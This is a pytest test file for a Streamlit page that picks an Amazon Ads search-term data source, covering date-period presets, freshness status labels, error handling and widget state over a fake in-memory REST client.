"""Search Term source picker (modules/pages/search_term_source.py) and its first consumer, M2.

Pure helpers are tested directly with hand-derived expectations; the Streamlit flow runs in AppTest over
an in-file fake PostgREST client (no network: `_open_rest` is replaced before every script run).
"""
import dataclasses
import io
from datetime import date, datetime, timedelta, timezone

import openpyxl
import pandas as pd
import pytest
import requests
from streamlit.proto.WidgetStates_pb2 import WidgetState
from streamlit.testing.v1 import AppTest
from streamlit.testing.v1.element_tree import ButtonGroup

import ai.client as ai_client
import ai.runtime as ai_runtime
import modules.pages.search_term_report as search_term_report
import modules.pages.search_term_source as picker
from ai.agents.str.context import StrData, build_context
from core import ads_account_picker
from ai.agent_call import build_agent_call
from core.amazon_ads.report_provider import ProfileOption, ReportProvider
from core.search_term_analysis import (
    StrAnalysisParams,
    add_metric_columns,
    build_analysis_input,
    canonical_analysis_window,
    detect_columns,
)
from core.integrations.sync_jobs import SyncJob
from core.search_term_file import FORMAT_CONSOLE_2026, FORMAT_CONSOLE_LEGACY, FORMAT_UNKNOWN, FileAccount
from core.search_term_negatives import AD_GROUP_STATE_UNVERIFIED_NOTE, BulkExclusion, NegativeCandidate, negative_key
from modules.pages.search_term_report import (
    RELEASED_RANKING_KEY,
    _amount_unit,
    _bulk_file_name,
    _build_str_excel,
    _negative_candidate_rows,
    released_ranking_keys,
    rule_two_cvr,
)

# 15:00 UTC is 12:00 in Buenos Aires and 08:00 in Los Angeles, both on Sep 14.
NOW = datetime(2026, 9, 14, 15, 0, tzinfo=timezone.utc)
TODAY = date(2026, 9, 14)


def _option(**overrides) -> ProfileOption:
    fields = dict(
        profile_id="111", account_id=1, cliente="Luna Kids", account_name="Luna Kids MX", country_code="MX",
        currency_code="MXN", account_type="seller", timezone="America/Los_Angeles", status="active",
        data_from=date(2026, 7, 11), data_through=date(2026, 9, 13), refreshed_on=TODAY,
        last_success_at=datetime(2026, 9, 14, 10, 12, tzinfo=timezone.utc), last_error="",
    )
    fields.update(overrides)
    return ProfileOption(**fields)


def _job(**overrides) -> SyncJob:
    row = {"id": 7, "integration_slug": "amazon_ads", "job_kind": "sp_search_terms", "trigger": "scheduled_daily",
           "external_account_id": "111", "status": "completed", "phase": "", "attempts": 0, "max_attempts": 8,
           "created_at": "2026-09-14T10:00:00+00:00"}
    row.update(overrides)
    return SyncJob.from_row(row)


class TestPeriodOptions:
    def test_full_retention_offers_every_preset_ending_at_the_last_synced_day(self):
        options = picker.period_options(date(2026, 7, 11), date(2026, 9, 13))
        assert [option.key for option in options] == ["7", "14", "30", "60", "custom"]
        by_key = {option.key: option for option in options}
        # 30 days ending Sep 13 start on Aug 15 (13 days of Sep + 17 of Aug).
        assert (by_key["30"].start, by_key["30"].end) == (date(2026, 8, 15), date(2026, 9, 13))
        assert by_key["60"].start == date(2026, 7, 16)
        assert picker.default_period_key(options) == "7"

    def test_short_history_stops_at_the_first_preset_covering_it_and_clips_it(self):
        options = picker.period_options(date(2026, 8, 25), date(2026, 9, 13))  # 20 days kept
        assert [option.key for option in options] == ["7", "14", "30", "custom"]
        assert options[2].start == date(2026, 8, 25)

    def test_history_exactly_one_preset_long_needs_no_longer_preset(self):
        options = picker.period_options(date(2026, 8, 31), date(2026, 9, 13))  # 14 days kept
        assert [option.key for option in options] == ["7", "14", "custom"]

    def test_three_days_offer_a_clipped_week_as_default(self):
        options = picker.period_options(date(2026, 9, 11), date(2026, 9, 13))
        assert [option.key for option in options] == ["7", "custom"]
        assert options[0].start == date(2026, 9, 11)
        assert picker.default_period_key(options) == "7"

    def test_unknown_start_assumes_the_maximum_period(self):
        options = picker.period_options(None, date(2026, 9, 13))
        assert [option.key for option in options] == ["7", "14", "30", "60", "custom"]
        assert options[3].start == date(2026, 7, 16)


class TestClipCustomRange:
    def test_reversed_dates_are_swapped(self):
        assert picker.clip_custom_range(date(2026, 9, 10), date(2026, 9, 1), date(2026, 7, 11),
                                        date(2026, 9, 13)) == (date(2026, 9, 1), date(2026, 9, 10))

    def test_range_is_clamped_to_the_data_kept(self):
        assert picker.clip_custom_range(date(2026, 7, 1), date(2026, 9, 20), date(2026, 8, 1),
                                        date(2026, 9, 13)) == (date(2026, 8, 1), date(2026, 9, 13))

    def test_range_longer_than_sixty_days_keeps_the_last_sixty(self):
        start, end = picker.clip_custom_range(date(2026, 6, 1), date(2026, 9, 13), date(2026, 5, 1),
                                              date(2026, 9, 13))
        assert end == date(2026, 9, 13)
        assert (end - start).days + 1 == 60


class TestFreshnessPill:
    def test_refreshed_today_reads_up_to_date_with_buenos_aires_time(self):
        assert picker.freshness_pill(_option(), _job(), NOW) == ("ok", "Al día · actualizado hoy 07:12")

    def test_no_job_yet_is_ready(self):
        assert picker.freshness_pill(_option(), None, NOW)[0] == "ok"

    def test_refreshed_yesterday_says_when(self):
        option = _option(refreshed_on=date(2026, 9, 13),
                         last_success_at=datetime(2026, 9, 13, 10, 5, tzinfo=timezone.utc))
        assert picker.freshness_pill(option, _job(), NOW) == ("ok", "Actualizado ayer 07:05")

    def test_retrying_job_warns_with_the_next_attempt_time(self):
        option = _option(refreshed_on=date(2026, 9, 13),
                         last_success_at=datetime(2026, 9, 13, 10, 5, tzinfo=timezone.utc))
        job = _job(status="retrying", attempts=1, next_attempt_at="2026-09-14T15:30:00+00:00")
        assert picker.freshness_pill(option, job, NOW) == ("warn", "Datos de ayer · reintenta 12:30")

    def test_retrying_manual_refresh_after_todays_refresh_stays_ready(self):
        job = _job(status="retrying", trigger="manual", next_attempt_at="2026-09-14T15:30:00+00:00")
        assert picker.freshness_pill(_option(), job, NOW)[0] == "ok"

    def test_needs_reauth_is_an_error_since_the_last_success(self):
        option = _option(status="needs_reauth", refreshed_on=date(2026, 9, 12),
                         last_success_at=datetime(2026, 9, 12, 10, 0, tzinfo=timezone.utc))
        assert picker.freshness_pill(option, _job(), NOW) == ("err", "Sin actualizar desde el 12 sep")

    def test_needs_reauth_the_same_day_as_the_last_success_says_the_time(self):
        option = _option(status="needs_reauth", last_success_at=datetime(2026, 9, 14, 13, 5, tzinfo=timezone.utc))
        assert picker.freshness_pill(option, _job(), NOW) == ("err", "Sin actualizar desde hoy 10:05")

    def test_failed_job_with_stale_data_is_an_error(self):
        option = _option(refreshed_on=date(2026, 9, 11),
                         last_success_at=datetime(2026, 9, 11, 10, 0, tzinfo=timezone.utc))
        assert picker.freshness_pill(option, _job(status="failed"), NOW) == ("err", "Sin actualizar desde el 11 sep")

    def test_failed_manual_refresh_after_todays_refresh_stays_ready(self):
        assert picker.freshness_pill(_option(), _job(status="failed", trigger="manual"), NOW)[0] == "ok"

    def test_profile_without_data_is_the_first_load(self):
        option = _option(data_from=None, data_through=None, refreshed_on=None, last_success_at=None)
        assert picker.freshness_pill(option, _job(status="running", trigger="backfill"), NOW) == (
            "idle", "Primera carga en curso")

    def test_needs_reauth_wins_over_the_first_load(self):
        option = _option(status="needs_reauth", data_through=None, last_success_at=None)
        assert picker.freshness_pill(option, None, NOW) == ("err", "Sin actualizar")

    def test_open_job_reads_updating_with_the_request_time(self):
        job = _job(status="running", phase="waiting", created_at="2026-09-14T13:42:00+00:00")
        assert picker.freshness_pill(_option(), job, NOW) == ("idle", "Actualizando · pedido a las 10:42")
        assert picker.source_state(_option(), job, NOW) == picker.STATE_UPDATING

    @pytest.mark.parametrize("status", ["failed", "cancelled"])
    def test_closed_backfill_without_data_is_a_failed_first_load_that_does_not_poll(self, status):
        option = _option(data_from=None, data_through=None, refreshed_on=None, last_success_at=None)
        job = _job(status=status, trigger="backfill")
        assert picker.source_state(option, job, NOW) == picker.STATE_FIRST_LOAD_FAILED
        assert picker.freshness_pill(option, job, NOW) == ("err", "La primera carga falló")
        assert picker.STATE_FIRST_LOAD_FAILED not in picker._POLLING_STATES


class TestFirstLoadFailureDetail:
    def test_job_message_wins_and_query_strings_never_reach_the_screen(self):
        job = _job(status="failed", error_class="AdsApiError",
                   error_message="GET https://reports.example/r1.json.gz?X-Amz-Signature=abc failed")
        assert picker.first_load_failure_detail(_option(last_error="viejo"), job) == (
            "GET https://reports.example/r1.json.gz failed")

    def test_error_class_then_profile_error_fill_in_when_the_job_has_no_message(self):
        assert picker.first_load_failure_detail(_option(), _job(status="failed", error_class="AdsAccessDenied")) == (
            "AdsAccessDenied")
        assert picker.first_load_failure_detail(_option(last_error="Sin permiso"), None) == "Sin permiso"
        assert picker.first_load_failure_detail(_option(), None) == ""


class TestRefreshFeedback:
    @pytest.mark.parametrize("reason, expected", [
        ("created", ("toast", "Actualización pedida")),
        ("already_running", ("toast", "Ya hay una actualización en curso")),
        ("cooldown", ("toast", "Se pidió hace menos de 30 minutos")),
    ])
    def test_accepted_reasons_become_toasts(self, reason, expected):
        assert picker.refresh_feedback(reason) == expected

    @pytest.mark.parametrize("reason", ["profile_unavailable", "something_new"])
    def test_unavailable_or_unknown_reason_warns(self, reason):
        kind, message = picker.refresh_feedback(reason)
        assert kind == "warning"
        assert "Cuentas conectadas" in message


class TestFileAccounts:
    _ACCOUNTS = (FileAccount(key="A1", name="Marca Norte MX", currency_code="MXN", row_count=4),
                 FileAccount(key="A2", name="Marca Norte US", currency_code="USD", row_count=345))

    def test_previous_choice_is_kept_while_the_file_has_it(self):
        assert picker.default_file_account(self._ACCOUNTS, "A1") == "A1"

    def test_new_file_defaults_to_the_account_with_most_rows(self):
        assert picker.default_file_account(self._ACCOUNTS, None) == "A2"
        assert picker.default_file_account(self._ACCOUNTS, "gone") == "A2"

    def test_tie_keeps_the_file_order(self):
        tied = (FileAccount("B1", "Uno", "USD", 10), FileAccount("B2", "Dos", "USD", 10))
        assert picker.default_file_account(tied, None) == "B1"

    def test_labels_and_summary_use_dot_thousands(self):
        assert picker.file_account_label(self._ACCOUNTS[1]) == "Marca Norte US · 345 filas"
        assert picker.count_label(1284) == "1.284"

    def test_currency_note_names_the_column_it_came_from(self):
        note = picker.file_currency_html(FORMAT_CONSOLE_2026, "USD")
        assert "Montos en" in note and "USD" in note and "«Budget currency»" in note
        assert "«Currency»" in picker.file_currency_html(FORMAT_CONSOLE_LEGACY, "MXN")

    @pytest.mark.parametrize("file_format, currency", [(FORMAT_CONSOLE_LEGACY, ""), (FORMAT_UNKNOWN, "")])
    def test_missing_currency_is_said_plainly(self, file_format, currency):
        assert "Moneda no informada en el archivo" in picker.file_currency_html(file_format, currency)


class TestProgress:
    def test_waiting_job_has_the_request_done_and_amazon_working(self):
        states = [step.state for step in picker.phase_steps(_job(status="running", phase="waiting"))]
        assert states == ["done", "working", "queued"]

    def test_pending_job_is_still_requesting(self):
        states = [step.state for step in picker.phase_steps(_job(status="pending", phase=""))]
        assert states == ["working", "queued", "queued"]

    def test_chunks_are_listed_oldest_first_with_their_state(self):
        rows = [{"window_start": "2026-07-25", "window_end": "2026-08-07", "status": "requested"},
                {"window_start": "2026-07-11", "window_end": "2026-07-24", "status": "saved"},
                {"window_start": "2026-09-05", "window_end": "2026-09-13", "status": "to_request"}]
        steps = picker.chunk_progress(rows)
        assert [(step.label, step.state, step.note) for step in steps] == [
            ("11 – 24 jul", "done", "listo"),
            ("25 jul – 7 ago", "working", "generando"),
            ("5 – 13 sep", "queued", "en espera"),
        ]


class TestPinnedData:
    def test_later_success_is_newer_data(self):
        pinned = _option()
        current = _option(last_success_at=pinned.last_success_at + timedelta(hours=3))
        assert picker.has_newer_data(pinned, current)
        assert not picker.has_newer_data(current, current)

    def test_nothing_loaded_yet_is_repinned(self):
        assert picker.should_repin(None)
        assert picker.should_repin(_option(data_through=None))
        assert not picker.should_repin(_option())


class TestLabels:
    @pytest.mark.parametrize("start, end, expected", [
        (date(2026, 8, 15), date(2026, 9, 13), "15 ago – 13 sep 2026"),
        (date(2026, 8, 18), date(2026, 8, 24), "18 – 24 ago 2026"),
        (date(2025, 12, 28), date(2026, 1, 3), "28 dic 2025 – 3 ene 2026"),
        (date(2026, 9, 13), date(2026, 9, 13), "13 sep 2026"),
    ])
    def test_date_range_label(self, start, end, expected):
        assert picker.date_range_label(start, end) == expected

    def test_data_through_note_is_relative_to_the_profile_day(self):
        assert picker.data_through_note(date(2026, 9, 13), TODAY) == "Datos hasta ayer (hora del perfil)"
        assert picker.data_through_note(date(2026, 9, 10), TODAY) == "Datos hasta el 10 sep (hora del perfil)"

    def test_empty_period_message_names_the_period_and_country(self):
        week = picker.PeriodOption(key="7", label="Últimos 7 días", days=7)
        assert picker.empty_period_message(week, date(2026, 9, 7), date(2026, 9, 13), "US") == (
            "Esta cuenta no tuvo búsquedas con clicks en los últimos 7 días en US. "
            "Probá con un período más largo u otro país.")
        clipped = picker.empty_period_message(week, date(2026, 9, 11), date(2026, 9, 13), "US")
        assert "entre el 11 sep y el 13 sep" in clipped

    def test_repeated_country_in_one_account_names_the_account_type(self):
        labels = picker.country_labels([_option(profile_id="1", country_code="US", account_type="seller"),
                                        _option(profile_id="2", country_code="US", account_type="vendor"),
                                        _option(profile_id="3", country_code="CA")])
        assert labels == {"1": "US · seller", "2": "US · vendor", "3": "CA"}


class TestPickerKeys:
    def test_two_prefixes_never_share_a_key(self):
        assert picker.picker_keys("str").isdisjoint(picker.picker_keys("bid"))
        assert all(key.startswith("bid_src_") for key in picker.picker_keys("bid"))

    def test_undeclared_key_name_is_refused(self):
        with pytest.raises(ValueError):
            picker.picker_key("str", "something_else")


class _FakeRest:
    """In-memory PostgREST: the three tables and two functions the picker reads."""

    def __init__(self, profile_rows, job_rows=(), request_rows=(), search_term_rows=(), refresh_reason="created"):
        self.profile_rows = list(profile_rows)
        self.job_rows = list(job_rows)
        self.request_rows = list(request_rows)
        self.search_term_rows = list(search_term_rows)
        self.refresh_reason = refresh_reason
        self.rpc_calls = []
        self.search_term_reads = []
        self.profiles_down = False
        self.failing_spans: set[int] = set()
        self.empty_spans: set[int] = set()
        self.analysis_rows: list[dict] = []
        self.settings_rows: list[dict] = []
        self.analysis_request_reason = "created"

    def select(self, table, params):
        if table == "ads_profile_sync":
            if self.profiles_down:
                raise requests.ConnectionError("pool timeout")
            return [dict(row) for row in self.profile_rows]
        if table == "integration_sync_jobs":
            profile_id = params["external_account_id"].removeprefix("eq.")
            kind = params.get("job_kind", "eq.sp_search_terms").removeprefix("eq.")
            digest = params.get("params->>input_digest", "").removeprefix("eq.")
            return [dict(row) for row in self.job_rows
                    if row["external_account_id"] == profile_id and row.get("job_kind", "sp_search_terms") == kind
                    and (not digest or (row.get("params") or {}).get("input_digest") == digest)][:1]
        if table == "ads_report_requests":
            return [dict(row) for row in self.request_rows]
        if table == "ai_analysis_settings":
            profile_id = params["subject_id"].removeprefix("eq.") if "subject_id" in params else None
            return [dict(row) for row in self.settings_rows if profile_id in (None, row["subject_id"])]
        if table == "ai_analyses":
            wanted = {column: value.removeprefix("eq.") for column, value in params.items()
                      if column in ("subject_id", "input_digest", "status") and value.startswith("eq.")}
            rows = [dict(row) for row in self.analysis_rows if all(row.get(c) == v for c, v in wanted.items())]
            if "id" in params:
                rows = [row for row in rows if f"neq.{row['id']}" != params["id"]]
            return sorted(rows, key=lambda row: row["id"], reverse=True)[:int(params.get("limit", 100))]
        raise AssertionError(f"unexpected table {table}")

    def rpc_csv(self, name, args, *, timeout_s=8):
        assert name == "search_terms_between"
        span = (date.fromisoformat(args["p_to"]) - date.fromisoformat(args["p_from"])).days + 1
        self.search_term_reads.append(span)
        if span in self.failing_spans:
            raise requests.Timeout("read timed out")
        rows = [] if span in self.empty_spans else self.search_term_rows
        return pd.DataFrame(rows, columns=_RPC_COLUMNS).to_csv(index=False).encode("utf-8")

    def rpc(self, name, args, *, timeout_s=8):
        self.rpc_calls.append((name, args))
        if name == "save_ai_analysis_settings":
            return True
        if name == "request_ai_analysis":
            reason = self.analysis_request_reason
            return [{"job_id": 501, "created": reason == "created", "reason": reason}]
        return [{"job_id": 99, "created": self.refresh_reason == "created", "reason": self.refresh_reason}]


_RPC_COLUMNS = ["campaign_id", "ad_group_id", "keyword_type", "keyword_id", "match_type", "targeting", "search_term",
                "campaign_name", "campaign_status", "ad_group_name", "keyword_text", "ad_keyword_status",
                "portfolio_id", "portfolio_name", "currency_code", "impressions", "clicks", "purchases_7d",
                "units_7d", "purchases_14d", "units_14d", "cost", "sales_7d", "sales_14d"]


def _term_row(search_term, *, match_type, clicks, orders, cost, sales, keyword_text="", impressions=1000):
    return {"campaign_id": "3001", "ad_group_id": "4001", "keyword_type": match_type, "keyword_id": "5001",
            "match_type": match_type, "targeting": keyword_text or "close-match", "search_term": search_term,
            "campaign_name": "LK - SP - KW", "campaign_status": "ENABLED", "ad_group_name": "AG Pijamas",
            "keyword_text": keyword_text, "ad_keyword_status": "ENABLED", "portfolio_id": "", "portfolio_name": "",
            "currency_code": "MXN", "impressions": impressions, "clicks": clicks, "purchases_7d": orders,
            "units_7d": orders, "purchases_14d": orders, "units_14d": orders, "cost": cost, "sales_7d": sales,
            "sales_14d": sales}


# Account CVR 5/82 clicks gives a 33-click R2 threshold and a 15 spend R3 threshold at the default price 30.
_SEARCH_TERM_ROWS = [
    _term_row("cheap toy box", match_type="BROAD", clicks=40, orders=0, cost=25.0, sales=0.0, keyword_text="toy box"),
    _term_row("b0abcdefgh", match_type="TARGETING_EXPRESSION_PREDEFINED", clicks=30, orders=0, cost=20.0, sales=0.0),
    _term_row("luna pajamas", match_type="EXACT", clicks=10, orders=5, cost=10.0, sales=100.0,
              keyword_text="luna pajamas"),
    _term_row("sleep sack", match_type="PHRASE", clicks=2, orders=0, cost=1.0, sales=0.0, keyword_text="sleep sack"),
]


_PROFILE_TZ = "America/Los_Angeles"


def _profile_today() -> date:
    """The app reads these rows in the profile's own zone, so the runner's clock must not name their days."""
    return datetime.now(timezone.utc).astimezone(picker.profile_timezone(_PROFILE_TZ, "")).date()


def _synced_today(now: datetime | None = None) -> datetime:
    """A recent sync, dated inside the display zone's day.

    freshness_pill dates last_success_at in DISPLAY_TIMEZONE, so a plain now-1h
    reads as "actualizado ayer" during the first hour of that zone's day.
    """
    if now is None:
        now = datetime.now(timezone.utc)
    midnight = now.astimezone(picker.DISPLAY_TIMEZONE).replace(hour=0, minute=0, second=0, microsecond=0)
    return max(now - timedelta(hours=1), midnight.astimezone(timezone.utc))


def _profile_row(**overrides):
    today = _profile_today()
    yesterday = today - timedelta(days=1)
    row = {"profile_id": "111", "account_id": 1, "cliente": "Luna Kids", "account_name": "Luna Kids MX",
           "country_code": "MX", "currency_code": "MXN", "account_type": "seller", "timezone": _PROFILE_TZ,
           "status": "active", "data_from": (yesterday - timedelta(days=64)).isoformat(),
           "data_through": yesterday.isoformat(), "refreshed_on": today.isoformat(),
           "last_success_at": _synced_today().isoformat(), "last_error": ""}
    row.update(overrides)
    return row


def test_the_synced_fixture_stays_on_the_display_day_at_every_hour():
    """The build ran at 00:01 in the display zone and now-1h dated the sync to the day before."""
    for minutes in range(0, 24 * 60, 7):
        now = datetime(2026, 9, 16, tzinfo=timezone.utc) + timedelta(minutes=minutes)
        synced = _synced_today(now)
        assert synced <= now
        assert (synced.astimezone(picker.DISPLAY_TIMEZONE).date()
                == now.astimezone(picker.DISPLAY_TIMEZONE).date())


def _completed_job_row():
    return {"id": 7, "integration_slug": "amazon_ads", "job_kind": "sp_search_terms", "trigger": "scheduled_daily",
            "external_account_id": "111", "status": "completed", "phase": "", "attempts": 0, "max_attempts": 8,
            "created_at": datetime.now(timezone.utc).isoformat()}


_PICKER_SCRIPT = """
import streamlit as st
from modules.pages.search_term_source import render_source_picker
st.cache_data.clear()
for prefix in PREFIXES:
    source = render_source_picker(prefix)
    st.session_state[f"test_result_{prefix}"] = (
        None if source is None else (source.label, len(source.frame), source.currency_code, source.bulk_ready,
                                     source.signature))
"""


@pytest.fixture(autouse=True)
def _single_select_button_groups(monkeypatch):
    # AppTest 1.43 serializes button groups as multi-select (st.feedback); a segmented control holds one value.
    def widget_state(group):
        state = WidgetState()
        state.id = group.id
        value = group.value
        selected = value if isinstance(value, list) else [] if value is None else [value]
        state.int_array_value.data[:] = [group.options.index(group.format_func(option)) for option in selected]
        return state
    monkeypatch.setattr(ButtonGroup, "_widget_state", property(widget_state))


def _picker_app(monkeypatch, fake, prefixes=("str",)) -> AppTest:
    monkeypatch.setattr(picker, "_open_rest", lambda: fake)
    return AppTest.from_string(_PICKER_SCRIPT.replace("PREFIXES", repr(tuple(prefixes))), default_timeout=30)


def _picker_keys_in_session(app: AppTest) -> set[str]:
    return {key for key in app.session_state._state.filtered_state if not key.startswith("test_result_")}


def _markdown(app: AppTest) -> str:
    return " ".join(str(element.value) for element in app.markdown)


class TestPickerApp:
    def test_without_connected_accounts_it_is_todays_uploader_plus_the_hint(self, monkeypatch):
        app = _picker_app(monkeypatch, None)
        app.run()
        assert not app.exception
        assert app.session_state["test_result_str"] is None
        assert [caption.value for caption in app.caption] == [picker.NO_CONNECTION_HINT]
        assert _picker_keys_in_session(app) <= picker.picker_keys("str")

    def test_synced_profile_returns_api_data_in_the_account_currency(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        assert not app.exception
        label, rows, currency, bulk_ready, _ = app.session_state["test_result_str"]
        assert (label, rows, currency, bulk_ready) == ("Luna Kids · MX", 4, "MXN", True)
        page = _markdown(app)
        assert "Datos de Amazon Ads" in page and "Al día · actualizado hoy" in page
        assert "4 términos" in page and "Datos hasta ayer (hora del perfil)" in page

    def test_two_prefixes_mount_side_by_side_with_disjoint_keys(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        str_app = _picker_app(monkeypatch, fake, prefixes=("str",))
        str_app.run()
        bid_app = _picker_app(monkeypatch, fake, prefixes=("bid",))
        bid_app.run()
        str_keys, bid_keys = _picker_keys_in_session(str_app), _picker_keys_in_session(bid_app)
        assert str_keys and bid_keys and str_keys.isdisjoint(bid_keys)
        assert str_keys <= picker.picker_keys("str") and bid_keys <= picker.picker_keys("bid")

        both = _picker_app(monkeypatch, fake, prefixes=("str", "bid"))
        both.run()
        assert not both.exception

    def test_update_now_asks_for_a_manual_refresh_and_toasts_the_answer(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        app.button(key="str_src_refresh").click().run()
        assert not app.exception
        assert fake.rpc_calls and fake.rpc_calls[0][0] == "request_manual_refresh"
        assert fake.rpc_calls[0][1]["p_profile_id"] == "111"
        assert [toast.value for toast in app.toast] == ["Actualización pedida"]

    def test_open_job_disables_the_refresh_and_keeps_the_loaded_data(self, monkeypatch):
        job = dict(_completed_job_row(), status="running", phase="waiting")
        app = _picker_app(monkeypatch, _FakeRest([_profile_row()], [job], search_term_rows=_SEARCH_TERM_ROWS))
        app.run()
        assert not app.exception
        buttons = {button.key: button for button in app.button}
        assert buttons["str_src_refresh_busy"].proto.disabled and "str_src_refresh" not in buttons
        assert "Amazon generando el reporte" in _markdown(app)
        assert app.session_state["test_result_str"] is not None

    def test_period_without_searches_explains_instead_of_analyzing_nothing(self, monkeypatch):
        app = _picker_app(monkeypatch, _FakeRest([_profile_row()], [_completed_job_row()]))
        app.run()
        assert not app.exception
        assert app.session_state["test_result_str"] is None
        assert [info.value for info in app.info] == [
            "Esta cuenta no tuvo búsquedas con clicks en los últimos 7 días en MX. "
            "Probá con un período más largo u otro país."]

    def test_custom_period_reads_the_picked_range(self, monkeypatch):
        app = _picker_app(monkeypatch, _FakeRest([_profile_row()], [_completed_job_row()],
                                                 search_term_rows=_SEARCH_TERM_ROWS))
        app.run()
        app.selectbox(key="str_src_period").set_value("custom").run()
        assert not app.exception
        assert [date_input.label for date_input in app.date_input] == ["Rango"]
        assert app.session_state["test_result_str"] is not None

    def test_newer_sync_is_offered_but_never_swapped_in_silently(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        first_signature = app.session_state["test_result_str"][4]

        fake.profile_rows = [_profile_row(last_success_at=datetime.now(timezone.utc).isoformat())]
        app.run()
        assert picker.NEWER_DATA_MESSAGE in _markdown(app)
        assert app.session_state["test_result_str"][4] == first_signature

        app.button(key="str_src_load_newer").click().run()
        assert not app.exception
        assert app.session_state["test_result_str"][4] != first_signature

    def test_first_load_shows_chunk_progress_and_no_data(self, monkeypatch):
        profile = _profile_row(data_from=None, data_through=None, refreshed_on=None, last_success_at=None)
        job = dict(_completed_job_row(), status="running", phase="waiting", trigger="backfill")
        chunks = [{"window_start": "2026-07-11", "window_end": "2026-07-24", "status": "saved"},
                  {"window_start": "2026-07-25", "window_end": "2026-08-07", "status": "requested"}]
        app = _picker_app(monkeypatch, _FakeRest([profile], [job], request_rows=chunks))
        app.run()
        assert not app.exception
        assert app.session_state["test_result_str"] is None
        page = _markdown(app)
        assert "Primera carga en curso" in page and "11 – 24 jul" in page and "generando" in page

    def test_needs_reauth_sends_the_user_to_connected_accounts(self, monkeypatch):
        fake = _FakeRest([_profile_row(status="needs_reauth")], [_completed_job_row()],
                         search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        assert picker.NEEDS_REAUTH_MESSAGE in _markdown(app)
        app.button(key="str_src_go_accounts").click().run()
        assert app.session_state["selected_page"] == "🔑 Cuentas conectadas"

    def test_manual_mode_switch_shows_the_uploader_and_the_way_back(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        app.button(key="str_src_upload_manual").click().run()
        assert not app.exception
        assert app.session_state["test_result_str"] is None
        assert picker.MANUAL_MODE_NOTE in _markdown(app)
        app.button(key="str_src_back_to_api").click().run()
        assert app.session_state["test_result_str"] is not None

    def test_failed_first_load_says_so_and_offers_the_manual_upload(self, monkeypatch):
        profile = _profile_row(data_from=None, data_through=None, refreshed_on=None, last_success_at=None)
        job = dict(_completed_job_row(), status="failed", trigger="backfill", error_class="AdsApiError",
                   error_message="GET https://reports.example/r1.json.gz?X-Amz-Signature=abc failed")
        app = _picker_app(monkeypatch, _FakeRest([profile], [job]))
        app.run()
        assert not app.exception
        assert app.session_state["test_result_str"] is None
        page = _markdown(app)
        assert "La primera carga falló" in page and picker.FIRST_LOAD_FAILED_MESSAGE in page
        assert "Primera carga en curso" not in page and "X-Amz-Signature" not in page
        app.button(key="str_src_upload_failed").click().run()
        assert picker.MANUAL_MODE_NOTE in _markdown(app)

    @pytest.mark.parametrize("status", ["retrying", "failed"])
    def test_status_messages_never_send_users_to_the_admin_only_request_log(self, monkeypatch, status):
        stale = _profile_row(refreshed_on=(_profile_today() - timedelta(days=3)).isoformat())
        job = dict(_completed_job_row(), status=status, next_attempt_at=datetime.now(timezone.utc).isoformat())
        app = _picker_app(monkeypatch, _FakeRest([stale], [job], search_term_rows=_SEARCH_TERM_ROWS))
        app.run()
        assert not app.exception
        page = _markdown(app)
        assert picker.ASK_AN_ADMIN in page and "Registro de solicitudes" not in page

    def test_chosen_account_stays_when_another_account_appears(self, monkeypatch):
        fake = _FakeRest([_profile_row(profile_id="1", cliente="Acme", country_code="US", currency_code="USD"),
                          _profile_row(profile_id="2", cliente="Luna", country_code="MX")],
                         search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        app.selectbox(key="str_src_account").set_value("Luna").run()
        assert app.session_state["test_result_str"][0] == "Luna · MX"

        # A newly connected account changes the option list, as the worker's next profile sync would.
        fake.profile_rows.insert(1, _profile_row(profile_id="3", cliente="Beta", country_code="US"))
        app.run()
        app.run()
        assert not app.exception
        assert app.selectbox(key="str_src_account").value == "Luna"
        assert app.session_state["test_result_str"][0] == "Luna · MX"

    def test_chosen_period_stays_when_the_next_account_offers_fewer_periods(self, monkeypatch):
        yesterday = _profile_today() - timedelta(days=1)
        fake = _FakeRest([_profile_row(profile_id="1", cliente="Acme", country_code="US"),
                          _profile_row(profile_id="2", cliente="Nueva", country_code="US",
                                       data_from=(yesterday - timedelta(days=19)).isoformat())],
                         search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        app.selectbox(key="str_src_period").set_value("14").run()
        app.selectbox(key="str_src_account").set_value("Nueva").run()
        app.run()
        app.run()
        assert not app.exception
        assert app.selectbox(key="str_src_period").value == "14"
        assert fake.search_term_reads[-1] == 14

    def test_failed_read_keeps_the_loaded_data_and_says_so(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        fake.failing_spans = {60}
        app = _picker_app(monkeypatch, fake)
        app.run()
        loaded = app.session_state["test_result_str"]
        app.selectbox(key="str_src_period").set_value("60").run()
        assert not app.exception
        assert app.session_state["test_result_str"] == loaded
        (error,) = app.error
        assert error.value.startswith("No se pudo leer los search terms de Amazon Ads")
        assert error.value.endswith(picker.KEPT_DATA_NOTE)

    def test_accounts_read_failure_keeps_the_loaded_data_and_the_period(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        app.selectbox(key="str_src_period").set_value("14").run()
        loaded = app.session_state["test_result_str"]

        fake.profiles_down = True
        app.run()
        assert not app.exception
        assert app.session_state["test_result_str"] == loaded
        assert [warning.value for warning in app.warning] == [picker.ACCOUNTS_UNREADABLE_MESSAGE]

        fake.profiles_down = False
        app.run()
        assert not app.exception
        assert app.selectbox(key="str_src_period").value == "14"
        assert app.session_state["test_result_str"] == loaded

